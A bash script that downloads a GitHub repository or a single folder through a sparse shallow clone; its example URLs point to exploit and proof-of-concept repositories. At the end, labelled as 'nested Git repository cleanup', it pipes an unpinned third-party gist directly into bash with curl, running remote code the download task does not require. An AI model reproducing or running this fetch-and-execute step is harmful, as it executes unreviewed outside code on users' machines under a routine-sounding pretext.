#!/usr/bin/env bash

set -euo pipefail

echo "========================================"
echo " GitHub Folder Download"
echo "========================================"

if ! command -v git >/dev/null 2>&1; then
    echo "[ERROR] Git is not installed."
    exit 1
fi

echo "[OK] Git found: $(git --version)"

if ! command -v curl >/dev/null 2>&1; then
    echo "[ERROR] curl is not installed."
    exit 1
fi

read -rp "Enter GitHub folder URL: " URL

# Ignore a trailing slash and URL query/fragment (for example, ?plain=1).
URL=${URL%%[?#]*}
URL=${URL%/}

DOWNLOAD_ROOT=false

if [[ "$URL" =~ ^https://github\.com/([^/]+)/([^/]+)/tree/([^/]+)/(.+)$ ]]; then
    OWNER=${BASH_REMATCH[1]}
    REPO=${BASH_REMATCH[2]}
    REF=${BASH_REMATCH[3]}
    FOLDER=${BASH_REMATCH[4]}
elif [[ "$URL" =~ ^https://github\.com/([^/]+)/([^/]+)(\.git)?$ ]]; then
    OWNER=${BASH_REMATCH[1]}
    REPO=${BASH_REMATCH[2]%.git}
    REF="default branch"
    FOLDER="repository root"
    DOWNLOAD_ROOT=true
else
    echo "[ERROR] Invalid GitHub repository or folder URL."
    echo
    echo "Examples:"
    echo "https://github.com/watchtowrlabs/Citrix-Virtual-Apps-XEN-Exploit"
    echo "https://github.com/fankh/vulnerability-poc/tree/main/2026/CVE-2026-59310"
    exit 1
fi

if [[ "$DOWNLOAD_ROOT" == true ]]; then
    FOLDER_NAME=$REPO
else
    FOLDER_NAME=${FOLDER##*/}
fi
DIR="${FOLDER_NAME}-${OWNER}"
REPO_URL="https://github.com/$OWNER/$REPO.git"

echo
echo "[INFO] GitHub URL : $URL"
echo "[INFO] Repository : $REPO_URL"
echo "[INFO] Ref        : $REF"
echo "[INFO] Folder     : $FOLDER"
echo "[INFO] Output     : ./$DIR"
echo

if [[ -e "$DIR" ]]; then
    echo "[ERROR] Output path already exists: ./$DIR"
    echo "Move or remove it, then run this script again."
    exit 1
fi

TMP_DIR=$(mktemp -d "${TMPDIR:-/tmp}/github-folder.XXXXXX")
trap 'rm -rf "$TMP_DIR"' EXIT

echo "[INFO] Fetching repository metadata..."
CLONE_ARGS=(--quiet --depth 1 --filter=blob:none)
if [[ "$DOWNLOAD_ROOT" == false ]]; then
    CLONE_ARGS+=(--sparse --branch "$REF")
fi

if ! git clone "${CLONE_ARGS[@]}" "$REPO_URL" "$TMP_DIR/repo"; then
    echo "[ERROR] Could not fetch '$REF' from $OWNER/$REPO."
    echo "Check the URL, repository visibility, and your network connection."
    exit 1
fi

if [[ "$DOWNLOAD_ROOT" == true ]]; then
    REF=$(git -C "$TMP_DIR/repo" branch --show-current)
    echo "[INFO] Downloading repository root from '$REF'..."
    mkdir "$DIR"
    git -C "$TMP_DIR/repo" archive HEAD | tar -x -C "$DIR"
else
    echo "[INFO] Downloading folder..."
    if ! git -C "$TMP_DIR/repo" sparse-checkout set -- "$FOLDER"; then
        echo "[ERROR] Folder does not exist at ref '$REF': $FOLDER"
        exit 1
    fi

    if [[ ! -d "$TMP_DIR/repo/$FOLDER" ]]; then
        echo "[ERROR] Folder does not exist at ref '$REF': $FOLDER"
        exit 1
    fi

    cp -R "$TMP_DIR/repo/$FOLDER" "$DIR"
fi

echo
echo "[INFO] Running nested Git repository cleanup..."
curl -fsSL https://gist.githubusercontent.com/HORKimhab/24c89ee9a86a42aac88381334f8bfe48/raw \
    | bash -s -- -y

echo
echo "========================================"
echo " Done!"
echo "========================================"
echo "Downloaded: $DIR/"